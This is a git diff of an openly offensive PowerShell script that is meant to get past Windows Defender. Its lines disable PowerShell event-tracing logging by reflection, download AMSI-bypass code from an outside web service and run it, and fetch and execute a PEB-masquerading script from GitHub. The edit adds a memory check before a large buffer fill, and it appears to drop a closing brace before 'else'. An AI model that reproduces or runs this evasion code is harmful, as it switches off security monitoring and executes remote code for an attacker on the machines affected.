@@ -3,8 +3,9 @@ function Invoke-OneDoesNotSimplyBypassEntireWinDefender {
     [Reflection.Assembly]::LoadWithPartialName('System.Core').GetType('System.Diagnostics.Eventing.EventProvider').GetField('m_enabled','NonPublic,Instance').SetValue([Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider').GetField('etwProvider','NonPublic,Static').GetValue($null),0)
     $increment = 0
     $maxincrement = 30000000
-    For ($increment=0; $increment -lt $maxincrement;$increment++) { $increment++ }
-    $fillmybuffer = "a" * 300MB
+    For ($increment=0; $increment -lt $maxincrement) { $increment++ }
+    $powershellmemory = (Get-Process -Id $PID | Select-Object Name,@{Name="WorkingSet";Expression={($_.ws / 1024kb)}}).WorkingSet
+    if ($powershellmemory -lt 250) { $fillmybuffer = "a" * 300MB }
     $accessAMBY = Invoke-WebRequest https://amsi-fail.azurewebsites.net/api/Generate -UseBasicParsing
     Invoke-Expression $accessAMBY.Content
     Invoke-Expression(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/GetRektBoy724/sementara/master/Masquerade-PEB.ps1');
@@ -61,6 +62,6 @@ function Invoke-OneDoesNotSimplyBypassEntireWinDefender {
 $internetconnection = Test-Connection -ComputerName google.com -Quiet
 if ($internetconnection) {
     Invoke-OneDoesNotSimplyBypassEntireWinDefender
-}else {
+else {
     throw "This shit doesnt have internet connection,We cant continue!"
 }
